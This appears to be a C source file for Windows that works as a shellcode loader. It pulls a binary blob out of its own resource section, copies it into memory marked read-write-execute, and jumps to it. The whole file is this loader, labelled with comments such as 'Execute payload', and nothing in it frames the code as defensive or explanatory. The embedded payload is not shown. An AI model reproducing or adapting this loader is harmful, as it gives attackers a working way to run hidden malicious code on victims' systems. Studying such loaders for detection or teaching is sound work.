#include <Windows.h>
#include <stdio.h>
#include "resource.h"

int main()
{
    /* Load the resource */
    HRSRC hResource = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
    HGLOBAL hGlobal = LoadResource(NULL, hResource);
    LPVOID resourceAddr = LockResource(hGlobal);
    DWORD resourceSize = SizeofResource(NULL, hResource);

    /* Allocate executable memory and copy resource there */
    LPVOID addrPayload = VirtualAlloc(NULL, resourceSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(GetCurrentProcess(), addrPayload, resourceAddr, resourceSize, NULL);

    /* Execute payload */
    void (*func)() = (void (*)())addrPayload;
    func();

    /* Free memory */
    VirtualFree(addrPayload, 0, MEM_RELEASE);
}
